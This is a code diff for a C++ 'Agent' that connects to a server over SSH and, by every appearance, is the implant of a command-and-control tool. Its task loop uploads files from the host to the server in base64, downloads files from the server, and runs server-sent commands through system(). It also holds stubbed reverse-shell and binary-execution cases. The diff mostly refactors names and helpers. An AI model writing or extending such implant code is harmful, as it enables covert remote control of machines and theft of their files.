@@ -1,8 +1,5 @@
 #include "agent.h"
 #include "config.h"
-#include "b64.h"
-#include "beacon.h"
-#include "shell.h"
 
 // constructor for Agent class
 Agent::Agent() {
@@ -123,12 +120,6 @@ int Agent::authenticate(){
 int Agent::init_channel() {
 	// Initialize vars
   	int rc;
-	char tmp[3];
-	char *beacon = NULL;;
-	char tasking[2048];
-	int nbytes;
-
-	memset(tasking, 0, sizeof(tasking));
 	this->chan = ssh_channel_new(session);
 
 	printf("[+] Created new SSH channel\n");
@@ -154,6 +145,7 @@ int Agent::init_channel() {
     	ssh_channel_free(this->chan);
     	return rc;
   	}
+	return rc;
 }
 
 // PRIVATE: checked write to channel
@@ -173,8 +165,8 @@ int Agent::read(char *buffer, int len) {
 	if (nbytes < 0){
 		printf("Caught read error from server...\n");
     	return SSH_ERROR;
-	}	
-
+	}
+	return SSH_OK;
 }
 
 
@@ -186,9 +178,12 @@ int Agent::read(char *buffer, int len) {
 /////////////////////////// PUBLIC FUNCTIONS ////////////////////////////
 
 // directly forwards traffic along port 
-int Agent::direct_forwarding()
+int Agent::direct_forwarding(){
+	return 0;
+}
+/*int Agent::direct_forwarding()
 {
-	/*EXAMPLE FOR NOW*/ 
+	// EXAMPLE FOR NOW 
   	ssh_channel forwarding_channel;
   	int rc = 0;
  	char *http_get = "GET / HTTP/1.1\nHost: www.google.com\n\n";
@@ -217,7 +212,7 @@ int Agent::direct_forwarding()
   
   	ssh_channel_free(forwarding_channel);
   	return SSH_OK;
-}
+}*/
 
 
 // uploads file to the server
@@ -229,17 +224,17 @@ int Agent::upload_file(void *path) {
     char *file_data;
     char *enc_data;
     int size = 0;
-    int size_e = 0;
+    size_t size_e = 0;
     int rc = 0;
-	int offset = Misc::index_of((char*)path, '/', 1);
+	int offset = Common::index_of((char*)path, '/', 1);
 	memset(buff, 0, sizeof(buff));
     memset(directory, 0, sizeof(directory));
 	memset(tmpbuffer, 0, sizeof(tmpbuffer));
 	
 
 	// get info aboutthe file
-	printf("Sending file -> %s\n", path);
-	size = Misc::get_file((char*)path, &file_data);
+	//printf("Sending file -> %s\n", path);
+	size = Common::get_file((char*)path, &file_data);
 
 	path = path + offset +1;
 	// TODO: Update to next-gen tasking structure
@@ -258,15 +253,15 @@ int Agent::upload_file(void *path) {
     }
     
 	// get b64-encoded data size	
-    size_e = b64_encoded_size(size);
-    sprintf(tmpbuffer, "%d", size_e);
+    size_e = B64::enc_size(size);
+    sprintf(tmpbuffer, "%ld", size_e);
         
     // writes file size
     if(write(tmpbuffer, sizeof(tmpbuffer)) == SSH_ERROR) return 1;
     if(read(buff, sizeof(buff)) == SSH_ERROR) return 1;
 
 	// encode the data
-    enc_data = b64_encode((unsigned char *)file_data, size);
+    B64::encode((unsigned char *)file_data, size, &enc_data);
         
     // writes file 
 	if(write(enc_data, size_e) == SSH_ERROR) return 1;
@@ -281,8 +276,7 @@ int Agent::upload_file(void *path) {
 
 // downloads a file from the server
 int Agent::download_file(void *filename){
-	int rc = 0;
-    int size = 0;
+	int size = 0;
     int size_e = 0;
     char *data_ptr;
     char *enc_ptr;
@@ -306,10 +300,10 @@ int Agent::download_file(void *filename){
     // writes file size
 	if(write("ok", 3) == SSH_ERROR) return 1;
     if(read(data_ptr, size) == SSH_ERROR) return 1;
-    size_e = b64_decoded_size(data_ptr);
+    size_e = B64::dec_size(data_ptr);
 
 	enc_ptr = (char*)malloc(size_e);
-	if(!b64_decode(data_ptr, (unsigned char*)enc_ptr, size_e)){
+	if(!B64::decode(data_ptr, (unsigned char*)enc_ptr, size_e)){
         printf("Failed to decode data\n");
         free(data_ptr);
         free(enc_ptr);
@@ -362,30 +356,31 @@ int Agent::run()
 	while(read((char*)tmp, 8) != SSH_ERROR){
 		AgentJob *job = parse_tasking(tmp);
 		switch(job->get_type()) {
-			case AGENT_DOWN_FILE:
+			case AGENT_DIE:
+				printf("Got agent exit request\n");
+				break;
+			case AGENT_SLEEP:
+				printf("Got sleep request\n");
+				break;
+			case AGENT_DOWNLOAD_FILE:
 				printf("Got tasking to download file\n");
 				download_file(job->get_data());
 				break;
-			case AGENT_REV_SHELL:
+			case AGENT_UPLOAD_FILE:
+				upload_file(job->get_data());
+				break;
+			case AGENT_REVERSE_SHELL:
 				printf("Got tasking to start reverse shell\n");
 				//shell_unix(chan);
 				break;
-			case AGENT_UP_FILE:
-				upload_file(job->get_data());
-				break;
-			case AGENT_EXEC_SC:
+			case AGENT_EXECUTE_SHELLSCRIPT:
 				printf("Got tasking to execute command %s\n", (char*)(job->get_data()));
 				system((char*)(job->get_data()));
 				break;
-			case AGENT_EXEC_MODULE:
+			case AGENT_EXECUTE_BINARY:
 				printf("Got tasking to execute module\n");
 				//exec_module((char*)(job->get_data()));
 				break;
-
-			case AGENT_EXIT:
-				printf("Got agent exit request\n");
-				break;
-
 			default:
 				printf("Caught unknown tasking value: %d\n", job->get_type());
 				break;
